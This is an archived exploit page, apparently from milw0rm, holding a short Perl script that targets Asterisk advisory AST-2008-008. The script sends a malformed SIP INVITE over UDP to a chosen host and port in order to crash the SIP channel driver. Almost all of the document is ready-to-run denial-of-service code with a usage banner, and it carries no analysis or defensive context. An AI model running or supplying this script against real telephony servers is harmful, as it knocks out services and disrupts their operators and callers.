<html><head><title>Asterisk (SIP channel driver / in pedantic mode) Remote Crash Exploit</title></head><pre>#!/usr/bin/perl -w
###############


# asterisk AST-2008-008
# by armando.j.m.o@gmail.com
#AST-2008-008 - Remote Crash Vulnerability in SIP channel driver when run in pedantic mode

use Getopt::Std;
use IO::Socket;
use strict;

my %args;
getopts(&quot;h:p:&quot;, \%args);

if (!$args{h} || !$args{p}) { usage(); }


my $sock = IO::Socket::INET-&gt;new(
    Proto    =&gt; 'udp',
    PeerPort =&gt; $args{p},
    PeerAddr =&gt; $args{h},
) or die &quot;Could not create socket: $!\n&quot;;

$sock-&gt;send('INVITE sip:1234@'.$args{h}.' SIP/2.0\n
CSeq: 2 INVITE') or die &quot;Send error: $!\n&quot;;




sub usage {
    print STDERR
qq{ $0

Usage: $0 -h &lt;host&gt; -p &lt;port&gt;
        -h &lt;host&gt;       = host
        -p &lt;port&gt;       = port

Example:
        $0 -h target -p port


};

# milw0rm.com [2008-06-05]</pre></html>